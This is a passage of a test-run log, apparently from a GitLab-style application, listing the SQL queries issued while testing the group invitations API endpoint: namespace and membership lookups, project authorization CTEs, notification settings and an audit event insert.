\"namespaces\".\"id\" = \"members\".\"source_id\" WHERE \"members\".\"type\" = 'GroupMember' AND \"members\".\"source_type\" = 'Namespace' AND \"namespaces\".\"type\" = 'Group' AND \"members\".\"user_id\" = 741 AND \"members\".\"requested_at\" IS NULL AND (access_level \u003e= 10))\n       UNION\n       (SELECT \"namespaces\".\"id\", \"namespaces\".\"name\", \"namespaces\".\"path\", \"namespaces\".\"owner_id\", \"namespaces\".\"created_at\", \"namespaces\".\"updated_at\", \"namespaces\".\"type\", \"namespaces\".\"description\", \"namespaces\".\"avatar\", \"namespaces\".\"membership_lock\", \"namespaces\".\"share_with_group_lock\", \"namespaces\".\"visibility_level\", \"namespaces\".\"request_access_enabled\", \"namespaces\".\"ldap_sync_status\", \"namespaces\".\"ldap_sync_error\", \"namespaces\".\"ldap_sync_last_update_at\", \"namespaces\".\"ldap_sync_last_successful_update_at\", \"namespaces\".\"ldap_sync_last_sync_at\", \"namespaces\".\"description_html\", \"namespaces\".\"lfs_enabled\", \"namespaces\".\"parent_id\", \"namespaces\".\"shared_runners_minutes_limit\", \"namespaces\".\"repository_size_limit\", \"namespaces\".\"require_two_factor_authentication\", \"namespaces\".\"two_factor_grace_period\", \"namespaces\".\"cached_markdown_version\", \"namespaces\".\"project_creation_level\", \"namespaces\".\"runners_token\", \"namespaces\".\"file_template_project_id\", \"namespaces\".\"saml_discovery_token\", \"namespaces\".\"runners_token_encrypted\", \"namespaces\".\"custom_project_templates_group_id\", \"namespaces\".\"auto_devops_enabled\", \"namespaces\".\"extra_shared_runners_minutes_limit\", \"namespaces\".\"last_ci_minutes_notification_at\", \"namespaces\".\"last_ci_minutes_usage_notification_level\", \"namespaces\".\"subgroup_creation_level\", \"namespaces\".\"emails_disabled\", \"namespaces\".\"max_pages_size\", \"namespaces\".\"max_artifacts_size\", \"namespaces\".\"mentions_disabled\", \"namespaces\".\"default_branch_protection\", \"namespaces\".\"unlock_membership_to_ldap\", \"namespaces\".\"max_personal_access_token_lifetime\", \"namespaces\".\"push_rule_id\", \"namespaces\".\"shared_runners_enabled\", \"namespaces\".\"allow_descendants_override_disabled_shared_runners\", \"namespaces\".\"traversal_ids\" FROM \"namespaces\", \"base_and_ancestors\" WHERE \"namespaces\".\"type\" = 'Group' AND \"namespaces\".\"id\" = \"base_and_ancestors\".\"parent_id\")), \"base_and_descendants\" AS ((SELECT \"namespaces\".\"id\", \"namespaces\".\"name\", \"namespaces\".\"path\", \"namespaces\".\"owner_id\", \"namespaces\".\"created_at\", \"namespaces\".\"updated_at\", \"namespaces\".\"type\", \"namespaces\".\"description\", \"namespaces\".\"avatar\", \"namespaces\".\"membership_lock\", \"namespaces\".\"share_with_group_lock\", \"namespaces\".\"visibility_level\", \"namespaces\".\"request_access_enabled\", \"namespaces\".\"ldap_sync_status\", \"namespaces\".\"ldap_sync_error\", \"namespaces\".\"ldap_sync_last_update_at\", \"namespaces\".\"ldap_sync_last_successful_update_at\", \"namespaces\".\"ldap_sync_last_sync_at\", \"namespaces\".\"description_html\", \"namespaces\".\"lfs_enabled\", \"namespaces\".\"parent_id\", \"namespaces\".\"shared_runners_minutes_limit\", \"namespaces\".\"repository_size_limit\", \"namespaces\".\"require_two_factor_authentication\", \"namespaces\".\"two_factor_grace_period\", \"namespaces\".\"cached_markdown_version\", \"namespaces\".\"project_creation_level\", \"namespaces\".\"runners_token\", \"namespaces\".\"file_template_project_id\", \"namespaces\".\"saml_discovery_token\", \"namespaces\".\"runners_token_encrypted\", \"namespaces\".\"custom_project_templates_group_id\", \"namespaces\".\"auto_devops_enabled\", \"namespaces\".\"extra_shared_runners_minutes_limit\", \"namespaces\".\"last_ci_minutes_notification_at\", \"namespaces\".\"last_ci_minutes_usage_notification_level\", \"namespaces\".\"subgroup_creation_level\", \"namespaces\".\"emails_disabled\", \"namespaces\".\"max_pages_size\", \"namespaces\".\"max_artifacts_size\", \"namespaces\".\"mentions_disabled\", \"namespaces\".\"default_branch_protection\", \"namespaces\".\"unlock_membership_to_ldap\", \"namespaces\".\"max_personal_access_token_lifetime\", \"namespaces\".\"push_rule_id\", \"namespaces\".\"shared_runners_enabled\", \"namespaces\".\"allow_descendants_override_disabled_shared_runners\", \"namespaces\".\"traversal_ids\" FROM \"namespaces\" INNER JOIN \"members\" ON \"namespaces\".\"id\" = \"members\".\"source_id\" WHERE \"members\".\"type\" = 'GroupMember' AND \"members\".\"source_type\" = 'Namespace' AND \"namespaces\".\"type\" = 'Group' AND \"members\".\"user_id\" = 741 AND \"members\".\"requested_at\" IS NULL AND (access_level \u003e= 10))\n       UNION\n       (SELECT \"namespaces\".\"id\", \"namespaces\".\"name\", \"namespaces\".\"path\", \"namespaces\".\"owner_id\", \"namespaces\".\"created_at\", \"namespaces\".\"updated_at\", \"namespaces\".\"type\", \"namespaces\".\"description\", \"namespaces\".\"avatar\", \"namespaces\".\"membership_lock\", \"namespaces\".\"share_with_group_lock\", \"namespaces\".\"visibility_level\", \"namespaces\".\"request_access_enabled\", \"namespaces\".\"ldap_sync_status\", \"namespaces\".\"ldap_sync_error\", \"namespaces\".\"ldap_sync_last_update_at\", \"namespaces\".\"ldap_sync_last_successful_update_at\", \"namespaces\".\"ldap_sync_last_sync_at\", \"namespaces\".\"description_html\", \"namespaces\".\"lfs_enabled\", \"namespaces\".\"parent_id\", \"namespaces\".\"shared_runners_minutes_limit\", \"namespaces\".\"repository_size_limit\", \"namespaces\".\"require_two_factor_authentication\", \"namespaces\".\"two_factor_grace_period\", \"namespaces\".\"cached_markdown_version\", \"namespaces\".\"project_creation_level\", \"namespaces\".\"runners_token\", \"namespaces\".\"file_template_project_id\", \"namespaces\".\"saml_discovery_token\", \"namespaces\".\"runners_token_encrypted\", \"namespaces\".\"custom_project_templates_group_id\", \"namespaces\".\"auto_devops_enabled\", \"namespaces\".\"extra_shared_runners_minutes_limit\", \"namespaces\".\"last_ci_minutes_notification_at\", \"namespaces\".\"last_ci_minutes_usage_notification_level\", \"namespaces\".\"subgroup_creation_level\", \"namespaces\".\"emails_disabled\", \"namespaces\".\"max_pages_size\", \"namespaces\".\"max_artifacts_size\", \"namespaces\".\"mentions_disabled\", \"namespaces\".\"default_branch_protection\", \"namespaces\".\"unlock_membership_to_ldap\", \"namespaces\".\"max_personal_access_token_lifetime\", \"namespaces\".\"push_rule_id\", \"namespaces\".\"shared_runners_enabled\", \"namespaces\".\"allow_descendants_override_disabled_shared_runners\", \"namespaces\".\"traversal_ids\" FROM \"namespaces\", \"base_and_descendants\" WHERE \"namespaces\".\"type\" = 'Group' AND \"namespaces\".\"parent_id\" = \"base_and_descendants\".\"id\")) SELECT \"namespaces\".\"two_factor_grace_period\" FROM ((SELECT \"namespaces\".\"id\", \"namespaces\".\"name\", \"namespaces\".\"path\", \"namespaces\".\"owner_id\", \"namespaces\".\"created_at\", \"namespaces\".\"updated_at\", \"namespaces\".\"type\", \"namespaces\".\"description\", \"namespaces\".\"avatar\", \"namespaces\".\"membership_lock\", \"namespaces\".\"share_with_group_lock\", \"namespaces\".\"visibility_level\", \"namespaces\".\"request_access_enabled\", \"namespaces\".\"ldap_sync_status\", \"namespaces\".\"ldap_sync_error\", \"namespaces\".\"ldap_sync_last_update_at\", \"namespaces\".\"ldap_sync_last_successful_update_at\", \"namespaces\".\"ldap_sync_last_sync_at\", \"namespaces\".\"description_html\", \"namespaces\".\"lfs_enabled\", \"namespaces\".\"parent_id\", \"namespaces\".\"shared_runners_minutes_limit\", \"namespaces\".\"repository_size_limit\", \"namespaces\".\"require_two_factor_authentication\", \"namespaces\".\"two_factor_grace_period\", \"namespaces\".\"cached_markdown_version\", \"namespaces\".\"project_creation_level\", \"namespaces\".\"runners_token\", \"namespaces\".\"file_template_project_id\", \"namespaces\".\"saml_discovery_token\", \"namespaces\".\"runners_token_encrypted\", \"namespaces\".\"custom_project_templates_group_id\", \"namespaces\".\"auto_devops_enabled\", \"namespaces\".\"extra_shared_runners_minutes_limit\", \"namespaces\".\"last_ci_minutes_notification_at\", \"namespaces\".\"last_ci_minutes_usage_notification_level\", \"namespaces\".\"subgroup_creation_level\", \"namespaces\".\"emails_disabled\", \"namespaces\".\"max_pages_size\", \"namespaces\".\"max_artifacts_size\", \"namespaces\".\"mentions_disabled\", \"namespaces\".\"default_branch_protection\", \"namespaces\".\"unlock_membership_to_ldap\", \"namespaces\".\"max_personal_access_token_lifetime\", \"namespaces\".\"push_rule_id\", \"namespaces\".\"shared_runners_enabled\", \"namespaces\".\"allow_descendants_override_disabled_shared_runners\", \"namespaces\".\"traversal_ids\" FROM \"base_and_ancestors\" AS \"namespaces\" WHERE \"namespaces\".\"type\" = 'Group')\n       UNION\n       (SELECT \"namespaces\".\"id\", \"namespaces\".\"name\", \"namespaces\".\"path\", \"namespaces\".\"owner_id\", \"namespaces\".\"created_at\", \"namespaces\".\"updated_at\", \"namespaces\".\"type\", \"namespaces\".\"description\", \"namespaces\".\"avatar\", \"namespaces\".\"membership_lock\", \"namespaces\".\"share_with_group_lock\", \"namespaces\".\"visibility_level\", \"namespaces\".\"request_access_enabled\", \"namespaces\".\"ldap_sync_status\", \"namespaces\".\"ldap_sync_error\", \"namespaces\".\"ldap_sync_last_update_at\", \"namespaces\".\"ldap_sync_last_successful_update_at\", \"namespaces\".\"ldap_sync_last_sync_at\", \"namespaces\".\"description_html\", \"namespaces\".\"lfs_enabled\", \"namespaces\".\"parent_id\", \"namespaces\".\"shared_runners_minutes_limit\", \"namespaces\".\"repository_size_limit\", \"namespaces\".\"require_two_factor_authentication\", \"namespaces\".\"two_factor_grace_period\", \"namespaces\".\"cached_markdown_version\", \"namespaces\".\"project_creation_level\", \"namespaces\".\"runners_token\", \"namespaces\".\"file_template_project_id\", \"namespaces\".\"saml_discovery_token\", \"namespaces\".\"runners_token_encrypted\", \"namespaces\".\"custom_project_templates_group_id\", \"namespaces\".\"auto_devops_enabled\", \"namespaces\".\"extra_shared_runners_minutes_limit\", \"namespaces\".\"last_ci_minutes_notification_at\", \"namespaces\".\"last_ci_minutes_usage_notification_level\", \"namespaces\".\"subgroup_creation_level\", \"namespaces\".\"emails_disabled\", \"namespaces\".\"max_pages_size\", \"namespaces\".\"max_artifacts_size\", \"namespaces\".\"mentions_disabled\", \"namespaces\".\"default_branch_protection\", \"namespaces\".\"unlock_membership_to_ldap\", \"namespaces\".\"max_personal_access_token_lifetime\", \"namespaces\".\"push_rule_id\", \"namespaces\".\"shared_runners_enabled\", \"namespaces\".\"allow_descendants_override_disabled_shared_runners\", \"namespaces\".\"traversal_ids\" FROM \"base_and_descendants\" AS \"namespaces\" WHERE \"namespaces\".\"type\" = 'Group')) namespaces WHERE \"namespaces\".\"type\" = 'Group' AND \"namespaces\".\"require_two_factor_authentication\" = TRUE /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       72: SELECT \"namespaces\".\"id\", \"namespaces\".\"name\", \"namespaces\".\"path\", \"namespaces\".\"owner_id\", \"namespaces\".\"created_at\", \"namespaces\".\"updated_at\", \"namespaces\".\"type\", \"namespaces\".\"description\", \"namespaces\".\"avatar\", \"namespaces\".\"membership_lock\", \"namespaces\".\"share_with_group_lock\", \"namespaces\".\"visibility_level\", \"namespaces\".\"request_access_enabled\", \"namespaces\".\"ldap_sync_status\", \"namespaces\".\"ldap_sync_error\", \"namespaces\".\"ldap_sync_last_update_at\", \"namespaces\".\"ldap_sync_last_successful_update_at\", \"namespaces\".\"ldap_sync_last_sync_at\", \"namespaces\".\"description_html\", \"namespaces\".\"lfs_enabled\", \"namespaces\".\"parent_id\", \"namespaces\".\"shared_runners_minutes_limit\", \"namespaces\".\"repository_size_limit\", \"namespaces\".\"require_two_factor_authentication\", \"namespaces\".\"two_factor_grace_period\", \"namespaces\".\"cached_markdown_version\", \"namespaces\".\"project_creation_level\", \"namespaces\".\"runners_token\", \"namespaces\".\"file_template_project_id\", \"namespaces\".\"saml_discovery_token\", \"namespaces\".\"runners_token_encrypted\", \"namespaces\".\"custom_project_templates_group_id\", \"namespaces\".\"auto_devops_enabled\", \"namespaces\".\"extra_shared_runners_minutes_limit\", \"namespaces\".\"last_ci_minutes_notification_at\", \"namespaces\".\"last_ci_minutes_usage_notification_level\", \"namespaces\".\"subgroup_creation_level\", \"namespaces\".\"emails_disabled\", \"namespaces\".\"max_pages_size\", \"namespaces\".\"max_artifacts_size\", \"namespaces\".\"mentions_disabled\", \"namespaces\".\"default_branch_protection\", \"namespaces\".\"unlock_membership_to_ldap\", \"namespaces\".\"max_personal_access_token_lifetime\", \"namespaces\".\"push_rule_id\", \"namespaces\".\"shared_runners_enabled\", \"namespaces\".\"allow_descendants_override_disabled_shared_runners\", \"namespaces\".\"traversal_ids\" FROM \"namespaces\" WHERE \"namespaces\".\"owner_id\" = 741 AND \"namespaces\".\"type\" = 'User' LIMIT 1 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       73: INSERT INTO \"user_details\" (\"user_id\") VALUES (741) RETURNING \"user_id\" /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       74: RELEASE SAVEPOINT active_record_2 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       75: SELECT \"users\".* FROM \"users\" WHERE \"users\".\"id\" = 739 LIMIT 1 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       76: SELECT \"users\".* FROM \"users\" WHERE \"users\".\"id\" = 739 LIMIT 1 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       77: SELECT \"project_authorizations\".\"project_id\", \"project_authorizations\".\"access_level\" FROM \"project_authorizations\" WHERE \"project_authorizations\".\"user_id\" = 739 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       78: WITH RECURSIVE \"namespaces_cte\" AS ((SELECT \"namespaces\".\"id\", \"members\".\"access_level\" FROM \"namespaces\" INNER JOIN \"members\" ON \"namespaces\".\"id\" = \"members\".\"source_id\" WHERE \"members\".\"type\" = 'GroupMember' AND \"members\".\"source_type\" = 'Namespace' AND \"namespaces\".\"type\" = 'Group' AND \"members\".\"user_id\" = 739 AND \"members\".\"requested_at\" IS NULL AND (access_level \u003e= 10) AND \"members\".\"state\" = 0)\n       UNION\n       (SELECT \"namespaces\".\"id\", LEAST(\"members\".\"access_level\", \"group_group_links\".\"group_access\") AS access_level FROM \"namespaces\" INNER JOIN \"group_group_links\" ON \"group_group_links\".\"shared_group_id\" = \"namespaces\".\"id\" INNER JOIN \"members\" ON \"group_group_links\".\"shared_with_group_id\" = \"members\".\"source_id\" AND \"members\".\"source_type\" = 'Namespace' AND \"members\".\"requested_at\" IS NULL AND \"members\".\"user_id\" = 739 AND \"members\".\"state\" = 0 AND \"members\".\"access_level\" \u003e 5 WHERE \"namespaces\".\"type\" = 'Group')\n       UNION\n       (SELECT \"namespaces\".\"id\", GREATEST(\"members\".\"access_level\", \"namespaces_cte\".\"access_level\") AS access_level FROM \"namespaces\" INNER JOIN \"namespaces_cte\" ON \"namespaces_cte\".\"id\" = \"namespaces\".\"parent_id\" LEFT OUTER JOIN \"members\" ON \"members\".\"source_id\" = \"namespaces\".\"id\" AND \"members\".\"source_type\" = 'Namespace' AND \"members\".\"requested_at\" IS NULL AND \"members\".\"user_id\" = 739 AND \"members\".\"state\" = 0 AND \"members\".\"access_level\" \u003e 5 WHERE \"namespaces\".\"type\" = 'Group')) SELECT \"project_authorizations\".\"project_id\", MAX(access_level) AS access_level FROM ((SELECT projects.id AS project_id, \"members\".\"access_level\" FROM \"projects\" INNER JOIN \"members\" ON \"projects\".\"id\" = \"members\".\"source_id\" WHERE \"members\".\"type\" = 'ProjectMember' AND \"members\".\"source_type\" = 'Project' AND \"members\".\"user_id\" = 739 AND \"members\".\"requested_at\" IS NULL AND \"members\".\"state\" = 0)\n       UNION\n       (SELECT projects.id AS project_id, 50 AS access_level FROM \"projects\" INNER JOIN \"namespaces\" ON \"projects\".\"namespace_id\" = \"namespaces\".\"id\" WHERE \"namespaces\".\"owner_id\" = 739 AND \"namespaces\".\"type\" = 'User')\n       UNION\n       (SELECT \"projects\".\"id\" AS project_id, \"namespaces\".\"access_level\" FROM \"namespaces_cte\" \"namespaces\" INNER JOIN \"projects\" ON \"projects\".\"namespace_id\" = \"namespaces\".\"id\")\n       UNION\n       (SELECT \"project_group_links\".\"project_id\", LEAST(\"namespaces\".\"access_level\", \"project_group_links\".\"group_access\") AS access_level FROM \"namespaces_cte\" \"namespaces\" INNER JOIN project_group_links ON project_group_links.group_id = namespaces.id INNER JOIN projects ON projects.id = project_group_links.project_id INNER JOIN namespaces p_ns ON p_ns.id = projects.namespace_id WHERE (p_ns.share_with_group_lock IS FALSE))) project_authorizations GROUP BY \"project_authorizations\".\"project_id\" /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       79: SELECT \"users\".* FROM \"users\" WHERE \"users\".\"id\" = 739 LIMIT 1 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       80: SELECT \"web_hooks\".* FROM \"web_hooks\" WHERE \"web_hooks\".\"type\" = 'SystemHook' AND (recent_failures \u003c= 3 AND (disabled_until IS NULL OR disabled_until \u003c '2022-03-01 16:06:46.849960')) AND (recent_failures \u003c= 3 AND (disabled_until IS NULL OR disabled_until \u003c '2022-03-01 16:06:46.850634')) ORDER BY \"web_hooks\".\"id\" ASC LIMIT 1000 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       81: SELECT \"namespaces\".\"id\" FROM \"namespaces\" WHERE \"namespaces\".\"type\" = 'Group' AND \"namespaces\".\"id\" = 1011 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       82: SELECT \"notification_settings\".* FROM \"notification_settings\" WHERE \"notification_settings\".\"source_type\" = 'Namespace' AND \"notification_settings\".\"source_id\" = 1011 AND \"notification_settings\".\"user_id\" = 739 AND \"notification_settings\".\"level\" != 3 ORDER BY \"notification_settings\".\"id\" ASC LIMIT 1 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       83: SELECT \"notification_settings\".* FROM \"notification_settings\" WHERE \"notification_settings\".\"user_id\" = 739 AND \"notification_settings\".\"source_id\" IS NULL LIMIT 1 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       84: SAVEPOINT active_record_2 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       85: SELECT 1 AS one FROM \"notification_settings\" WHERE \"notification_settings\".\"user_id\" = 739 AND \"notification_settings\".\"source_type\" IS NULL AND \"notification_settings\".\"source_id\" IS NULL LIMIT 1 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       86: INSERT INTO \"notification_settings\" (\"user_id\", \"level\", \"created_at\", \"updated_at\") VALUES (739, 1, '2022-03-01 16:06:46.875892', '2022-03-01 16:06:46.875892') RETURNING \"id\" /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       87: RELEASE SAVEPOINT active_record_2 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       88: SELECT \"emails\".\"email\" FROM \"emails\" WHERE \"emails\".\"user_id\" = 739 AND \"emails\".\"confirmed_at\" IS NOT NULL /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       89: SELECT \"users\".* FROM \"users\" WHERE \"users\".\"id\" = 741 LIMIT 1 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       90: SELECT \"users\".* FROM \"users\" WHERE \"users\".\"id\" = 741 LIMIT 1 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       91: SELECT \"project_authorizations\".\"project_id\", \"project_authorizations\".\"access_level\" FROM \"project_authorizations\" WHERE \"project_authorizations\".\"user_id\" = 741 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       92: WITH RECURSIVE \"namespaces_cte\" AS ((SELECT \"namespaces\".\"id\", \"members\".\"access_level\" FROM \"namespaces\" INNER JOIN \"members\" ON \"namespaces\".\"id\" = \"members\".\"source_id\" WHERE \"members\".\"type\" = 'GroupMember' AND \"members\".\"source_type\" = 'Namespace' AND \"namespaces\".\"type\" = 'Group' AND \"members\".\"user_id\" = 741 AND \"members\".\"requested_at\" IS NULL AND (access_level \u003e= 10) AND \"members\".\"state\" = 0)\n       UNION\n       (SELECT \"namespaces\".\"id\", LEAST(\"members\".\"access_level\", \"group_group_links\".\"group_access\") AS access_level FROM \"namespaces\" INNER JOIN \"group_group_links\" ON \"group_group_links\".\"shared_group_id\" = \"namespaces\".\"id\" INNER JOIN \"members\" ON \"group_group_links\".\"shared_with_group_id\" = \"members\".\"source_id\" AND \"members\".\"source_type\" = 'Namespace' AND \"members\".\"requested_at\" IS NULL AND \"members\".\"user_id\" = 741 AND \"members\".\"state\" = 0 AND \"members\".\"access_level\" \u003e 5 WHERE \"namespaces\".\"type\" = 'Group')\n       UNION\n       (SELECT \"namespaces\".\"id\", GREATEST(\"members\".\"access_level\", \"namespaces_cte\".\"access_level\") AS access_level FROM \"namespaces\" INNER JOIN \"namespaces_cte\" ON \"namespaces_cte\".\"id\" = \"namespaces\".\"parent_id\" LEFT OUTER JOIN \"members\" ON \"members\".\"source_id\" = \"namespaces\".\"id\" AND \"members\".\"source_type\" = 'Namespace' AND \"members\".\"requested_at\" IS NULL AND \"members\".\"user_id\" = 741 AND \"members\".\"state\" = 0 AND \"members\".\"access_level\" \u003e 5 WHERE \"namespaces\".\"type\" = 'Group')) SELECT \"project_authorizations\".\"project_id\", MAX(access_level) AS access_level FROM ((SELECT projects.id AS project_id, \"members\".\"access_level\" FROM \"projects\" INNER JOIN \"members\" ON \"projects\".\"id\" = \"members\".\"source_id\" WHERE \"members\".\"type\" = 'ProjectMember' AND \"members\".\"source_type\" = 'Project' AND \"members\".\"user_id\" = 741 AND \"members\".\"requested_at\" IS NULL AND \"members\".\"state\" = 0)\n       UNION\n       (SELECT projects.id AS project_id, 50 AS access_level FROM \"projects\" INNER JOIN \"namespaces\" ON \"projects\".\"namespace_id\" = \"namespaces\".\"id\" WHERE \"namespaces\".\"owner_id\" = 741 AND \"namespaces\".\"type\" = 'User')\n       UNION\n       (SELECT \"projects\".\"id\" AS project_id, \"namespaces\".\"access_level\" FROM \"namespaces_cte\" \"namespaces\" INNER JOIN \"projects\" ON \"projects\".\"namespace_id\" = \"namespaces\".\"id\")\n       UNION\n       (SELECT \"project_group_links\".\"project_id\", LEAST(\"namespaces\".\"access_level\", \"project_group_links\".\"group_access\") AS access_level FROM \"namespaces_cte\" \"namespaces\" INNER JOIN project_group_links ON project_group_links.group_id = namespaces.id INNER JOIN projects ON projects.id = project_group_links.project_id INNER JOIN namespaces p_ns ON p_ns.id = projects.namespace_id WHERE (p_ns.share_with_group_lock IS FALSE))) project_authorizations GROUP BY \"project_authorizations\".\"project_id\" /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       93: SELECT \"users\".* FROM \"users\" WHERE \"users\".\"id\" = 741 LIMIT 1 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       94: SELECT \"web_hooks\".* FROM \"web_hooks\" WHERE \"web_hooks\".\"type\" = 'SystemHook' AND (recent_failures \u003c= 3 AND (disabled_until IS NULL OR disabled_until \u003c '2022-03-01 16:06:46.923336')) AND (recent_failures \u003c= 3 AND (disabled_until IS NULL OR disabled_until \u003c '2022-03-01 16:06:46.923650')) ORDER BY \"web_hooks\".\"id\" ASC LIMIT 1000 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       95: SELECT \"namespaces\".\"id\" FROM \"namespaces\" WHERE \"namespaces\".\"type\" = 'Group' AND \"namespaces\".\"id\" = 1011 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       96: SELECT \"notification_settings\".* FROM \"notification_settings\" WHERE \"notification_settings\".\"source_type\" = 'Namespace' AND \"notification_settings\".\"source_id\" = 1011 AND \"notification_settings\".\"user_id\" = 741 AND \"notification_settings\".\"level\" != 3 ORDER BY \"notification_settings\".\"id\" ASC LIMIT 1 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       97: SELECT \"notification_settings\".* FROM \"notification_settings\" WHERE \"notification_settings\".\"user_id\" = 741 AND \"notification_settings\".\"source_id\" IS NULL LIMIT 1 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       98: SAVEPOINT active_record_2 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       99: SELECT 1 AS one FROM \"notification_settings\" WHERE \"notification_settings\".\"user_id\" = 741 AND \"notification_settings\".\"source_type\" IS NULL AND \"notification_settings\".\"source_id\" IS NULL LIMIT 1 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       100: INSERT INTO \"notification_settings\" (\"user_id\", \"level\", \"created_at\", \"updated_at\") VALUES (741, 1, '2022-03-01 16:06:46.944434', '2022-03-01 16:06:46.944434') RETURNING \"id\" /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       101: RELEASE SAVEPOINT active_record_2 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       102: SELECT \"emails\".\"email\" FROM \"emails\" WHERE \"emails\".\"user_id\" = 741 AND \"emails\".\"confirmed_at\" IS NOT NULL /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       103: SELECT 1 AS one FROM \"members\" WHERE \"members\".\"invite_email\" = 'email1@example.com' AND \"members\".\"id\" != 1078 AND \"members\".\"source_type\" = 'Namespace' AND \"members\".\"source_id\" = 1011 LIMIT 1 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       104: SAVEPOINT active_record_2 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       105: INSERT INTO \"audit_events\" (\"author_id\", \"entity_id\", \"entity_type\", \"details\", \"author_name\", \"target_details\", \"created_at\", \"target_type\") VALUES (736, 1011, 'Group', '---\n       :add: user_access\n       :as: Developer\n       :author_name: Sidney Jones2\n       :target_id:\n       :member_id: 1078\n       :target_type: User\n       :target_details: Deleted User\n       ', 'Sidney Jones2', 'Deleted User', '2022-03-01 16:06:46.966287', 'User') RETURNING \"id\" /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       106: RELEASE SAVEPOINT active_record_2 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       107: SELECT \"namespaces\".\"id\", \"namespaces\".\"name\", \"namespaces\".\"path\", \"namespaces\".\"owner_id\", \"namespaces\".\"created_at\", \"namespaces\".\"updated_at\", \"namespaces\".\"type\", \"namespaces\".\"description\", \"namespaces\".\"avatar\", \"namespaces\".\"membership_lock\", \"namespaces\".\"share_with_group_lock\", \"namespaces\".\"visibility_level\", 